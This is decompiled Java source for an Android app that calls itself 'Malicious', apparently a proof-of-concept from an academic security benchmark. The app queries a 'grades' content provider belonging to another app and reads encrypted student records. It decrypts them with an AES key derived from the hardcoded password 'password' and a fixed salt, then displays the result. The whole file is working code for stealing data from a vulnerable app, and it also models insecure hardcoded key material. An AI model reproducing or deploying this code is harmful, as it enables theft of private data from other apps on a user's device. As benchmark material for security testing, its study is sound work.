package edu.ksu.cs.malicious;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri.Builder;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;
import java.io.UnsupportedEncodingException;
import java.security.GeneralSecurityException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import java.util.Iterator;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity
  extends AppCompatActivity
{
  private static String TAG = "Malicious";
  private static ArrayList<SecretKey> keys = null;
  
  public MainActivity() {}
  
  private ArrayList<SecretKey> getKeys(ArrayList<String> paramArrayList)
  {
    ArrayList localArrayList = new ArrayList();
    try
    {
      paramArrayList = paramArrayList.iterator();
      while (paramArrayList.hasNext())
      {
        PBEKeySpec localPBEKeySpec = new PBEKeySpec(((String)paramArrayList.next()).toCharArray(), "90dujHU*".getBytes(), 1000, 256);
        localArrayList.add(new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(localPBEKeySpec).getEncoded(), "AES"));
      }
      return localArrayList;
    }
    catch (NoSuchAlgorithmException|InvalidKeySpecException paramArrayList)
    {
      paramArrayList.printStackTrace();
    }
    return null;
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2131296283);
    paramBundle = new ArrayList();
    paramBundle.add("password");
    keys = getKeys(paramBundle);
  }
  
  protected void onResume()
  {
    super.onResume();
    ((Button)findViewById(2131165245)).setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        paramAnonymousView = "null,null";
        TextView localTextView1 = (TextView)MainActivity.this.findViewById(2131165271);
        TextView localTextView2 = (TextView)MainActivity.this.findViewById(2131165270);
        Object localObject1 = new Uri.Builder();
        ((Uri.Builder)localObject1).authority("edu.ksu.cs.benign.grades");
        ((Uri.Builder)localObject1).scheme("content");
        Cursor localCursor = MainActivity.this.getContentResolver().query(((Uri.Builder)localObject1).build(), null, null, null, null, null);
        if ((localCursor != null) && (localCursor.getCount() > 0)) {
          while (localCursor.moveToNext())
          {
            localObject1 = localCursor.getString(localCursor.getColumnIndex("stuInfo")).split("\\[");
            if (localObject1.length == 2)
            {
              Object localObject2 = MainActivity.TAG;
              Object localObject3 = new StringBuilder();
              ((StringBuilder)localObject3).append("IV = ");
              ((StringBuilder)localObject3).append(localObject1[0]);
              Log.d((String)localObject2, ((StringBuilder)localObject3).toString());
              localObject2 = MainActivity.TAG;
              localObject3 = new StringBuilder();
              ((StringBuilder)localObject3).append("data = ");
              ((StringBuilder)localObject3).append(localObject1[1]);
              Log.d((String)localObject2, ((StringBuilder)localObject3).toString());
              try
              {
                localObject2 = Cipher.getInstance("AES/CBC/PKCS5PADDING");
                localObject3 = new IvParameterSpec(Base64.decode(localObject1[0].getBytes(), 0));
                try
                {
                  ((Cipher)localObject2).init(2, (Key)MainActivity.keys.get(0), (AlgorithmParameterSpec)localObject3);
                  try
                  {
                    localObject1 = new String(((Cipher)localObject2).doFinal(Base64.decode(localObject1[1].getBytes(), 0)), "UTF-8");
                    paramAnonymousView = (View)localObject1;
                  }
                  catch (IllegalBlockSizeException|BadPaddingException|UnsupportedEncodingException localIllegalBlockSizeException)
                  {
                    Log.d(MainActivity.TAG, "Exception occurred while decrypting");
                  }
                  String[] arrayOfString = paramAnonymousView.split(",");
                  localTextView1.setText(arrayOfString[0].trim());
                  localTextView2.setText(arrayOfString[1].trim());
                }
                catch (InvalidAlgorithmParameterException|InvalidKeyException paramAnonymousView)
                {
                  Log.d(MainActivity.TAG, "Exception while initializing cipher");
                  throw new RuntimeException(paramAnonymousView);
                }
                Log.d(MainActivity.TAG, "No values found");
              }
              catch (NoSuchPaddingException|NoSuchAlgorithmException paramAnonymousView)
              {
                Log.d(MainActivity.TAG, "Exception occurred while creating cipher instance");
                throw new RuntimeException(paramAnonymousView);
              }
            }
          }
        }
        if (localCursor != null) {
          localCursor.close();
        }
      }
    });
  }
}
